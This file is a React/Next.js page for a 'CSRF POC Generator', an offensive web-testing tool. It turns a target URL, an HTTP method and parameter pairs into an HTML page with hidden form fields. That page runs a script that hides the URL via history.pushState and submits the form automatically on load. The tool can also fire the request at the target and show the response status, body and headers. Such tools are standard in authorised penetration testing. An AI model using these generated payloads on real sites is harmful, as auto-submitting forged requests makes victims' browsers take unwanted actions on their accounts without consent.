"use client";

import { useState, useEffect } from "react";
import { Button } from "@/app/components/ui/button";
import { Input } from "@/app/components/ui/input";
import { Textarea } from "@/app/components/ui/textarea";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/app/components/ui/select";

interface Param {
  name: string;
  value: string;
}

interface Payload {
  action: string;
  method: "GET" | "POST" | "PUT" | "DELETE";
  params: Param[];
}

interface TestResult {
  status: number;
  response: string;
  headers: Record<string, string>;
}

export default function Home() {
  const [payload, setPayload] = useState<Payload>({
    action: "https://example.com/api/update",
    method: "POST",
    params: [
      { name: "api_key", value: "dummy_api_key_123" },
      { name: "user_id", value: "user_123" },
      { name: "action", value: "update_profile" },
    ],
  });

  const [generatedHTML, setGeneratedHTML] = useState("");
  const [testResult, setTestResult] = useState<TestResult | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  const parseHTML = (html: string) => {
    try {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, "text/html");
      const form = doc.querySelector("form");
      if (form) {
        const action = form.getAttribute("action") || "";
        const method = (form.getAttribute("method")?.toUpperCase() ||
          "POST") as "GET" | "POST" | "PUT" | "DELETE";
        const inputs = form.querySelectorAll('input[type="hidden"]');
        const params = Array.from(inputs).map((input) => ({
          name: input.getAttribute("name") || "",
          value: input.getAttribute("value") || "",
        }));
        setPayload({ action, method, params });
      }
    } catch (error) {
      console.error("Error parsing HTML:", error);
    }
  };

  const generateHTML = () => {
    const html = `
<html>
  <body>
    <form action="${payload.action}" method="${payload.method}">
      ${payload.params
        .map(
          (param) =>
            `<input type="hidden" name="${param.name}" value="${param.value}" />`
        )
        .join("\n      ")}
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>`;
    setGeneratedHTML(html);
  };

  useEffect(() => {
    if (payload.params.length > 0) generateHTML();
  }, [payload, generateHTML]);

  const addParam = () => {
    setPayload((prev) => ({
      ...prev,
      params: [...prev.params, { name: "", value: "" }],
    }));
  };

  const removeParam = (index: number) => {
    setPayload((prev) => ({
      ...prev,
      params: prev.params.filter((_, i) => i !== index),
    }));
  };

  const updateParam = (index: number, field: keyof Param, value: string) => {
    setPayload((prev) => ({
      ...prev,
      params: prev.params.map((param, i) =>
        i === index ? { ...param, [field]: value } : param
      ),
    }));
  };

  const testPayload = async () => {
    setIsLoading(true);
    setTestResult(null);
    try {
      const formData = new FormData();
      payload.params.forEach((param) => {
        formData.append(param.name, param.value);
      });

      const response = await fetch(payload.action, {
        method: payload.method,
        body: formData,
      });

      // Get the raw response text
      const responseText = await response.text();
      console.log("Raw response:", responseText);

      // Get all response headers
      const headers: Record<string, string> = {};
      response.headers.forEach((value, key) => {
        headers[key] = value;
      });

      setTestResult({
        status: response.status,
        response: responseText,
        headers: headers,
      });
    } catch (error) {
      console.error("Fetch error:", error);
      setTestResult({
        status: 0,
        response: `Error: ${
          error instanceof Error ? error.message : "Unknown error"
        }`,
        headers: {},
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-primary text-white">
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="flex justify-between items-center mb-12">
          <h1 className="text-3xl font-primary text-accent tracking-wider">
            CSRF POC Generator
          </h1>
          <Button
            onClick={testPayload}
            disabled={!generatedHTML || isLoading}
            variant="action"
            size="lg"
          >
            {isLoading ? "Testing..." : "Test Payload"}
          </Button>
        </div>
      </div>

      <div className="container mx-auto px-4 sm:px-6 lg:px-8">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-7xl mx-auto">
          {/* Left Column - Form Fields */}
          <div className="space-y-8">
            <div>
              <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">
                Target URL
              </h2>
              <Input
                className="w-full"
                value={payload.action}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  setPayload((prev) => ({ ...prev, action: e.target.value }))
                }
                placeholder="Target URL"
              />
            </div>

            <div>
              <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">
                Method
              </h2>
              <Select
                value={payload.method}
                onValueChange={(value: "GET" | "POST" | "PUT" | "DELETE") =>
                  setPayload((prev) => ({
                    ...prev,
                    method: value,
                  }))
                }
              >
                <SelectTrigger className="w-full h-[48px] px-4 py-5 text-base text-white/60 placeholder:text-white/10 focus:border-red-700 outline-none border border-red-500 rounded-md">
                  <SelectValue placeholder="Select method" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="GET">GET</SelectItem>
                  <SelectItem value="POST">POST</SelectItem>
                  <SelectItem value="PUT">PUT</SelectItem>
                  <SelectItem value="DELETE">DELETE</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div>
              <div className="flex justify-between items-center mb-6">
                <h2 className="font-primary text-accent text-xl tracking-wider">
                  Parameters
                </h2>
                <Button onClick={addParam} variant="action" size="default">
                  Add Param
                </Button>
              </div>

              {payload.params.map((param, index) => (
                <div key={index} className="flex items-start gap-4 mb-4 w-full">
                  <div className="flex flex-col w-full gap-2 flex-grow">
                    <Input
                      value={param.name}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                        updateParam(index, "name", e.target.value)
                      }
                      placeholder="Name"
                      className="w-full"
                    />
                    <Input
                      value={param.value}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                        updateParam(index, "value", e.target.value)
                      }
                      placeholder="Value"
                      className="w-full"
                    />
                  </div>
                  <Button
                    onClick={() => removeParam(index)}
                    variant="default"
                    size="default"
                    className="w-auto p-0 text-xl text-red-500 hover:text-white"
                  >
                    ×
                  </Button>
                </div>
              ))}
            </div>
          </div>

          {/* Right Column - HTML Editor */}
          <div className="space-y-8">
            <div className="bg-primary/50 p-8 rounded-2xl border border-red-500">
              <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">
                HTML Payload:
              </h2>
              <Textarea
                value={generatedHTML}
                onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) => {
                  setGeneratedHTML(e.target.value);
                  parseHTML(e.target.value);
                }}
                className="h-[400px] font-mono"
                spellCheck="false"
              />
            </div>

            {/* Test Results */}
            {testResult && (
              <div className="bg-primary/50 p-8 rounded-2xl border border-red-500">
                <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">
                  Test Results:
                </h2>
                <div className="space-y-6">
                  <div className="flex items-center gap-2">
                    <span className="text-accent font-semibold">Status:</span>
                    <span
                      className={`px-4 py-1 rounded-full text-sm font-semibold ${
                        testResult.status === 200
                          ? "bg-green-500/20 text-green-500"
                          : "bg-red-500/20 text-red-500"
                      }`}
                    >
                      {testResult.status}
                    </span>
                  </div>
                  <div>
                    <span className="text-accent font-semibold block mb-3">
                      Response:
                    </span>
                    <pre className="bg-primary p-6 rounded-xl text-sm overflow-x-auto border border-accent">
                      {testResult.response}
                    </pre>
                  </div>
                  <div>
                    <span className="text-accent font-semibold block mb-3">
                      Headers:
                    </span>
                    <pre className="bg-primary p-6 rounded-xl text-sm overflow-x-auto border border-accent">
                      {testResult.headers
                        ? Object.entries(testResult.headers)
                            .map(([key, value]) => `${key}: ${value}`)
                            .join("\n")
                        : "No headers available"}
                    </pre>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
